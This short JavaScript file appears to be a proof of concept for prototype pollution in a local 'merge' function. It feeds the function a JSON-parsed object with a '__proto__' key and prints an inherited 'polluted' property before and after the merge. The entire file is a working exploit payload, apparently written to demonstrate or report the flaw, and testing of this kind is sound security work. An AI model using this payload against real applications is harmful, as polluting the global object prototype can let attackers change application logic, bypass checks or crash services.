const merge = require('./dist').default

console.log(`Before: ${{}.polluted}`)
merge([{}, JSON.parse('{"__proto__": {"polluted": true}, "foo": 2}')])
console.log(`After: ${{}.polluted}`)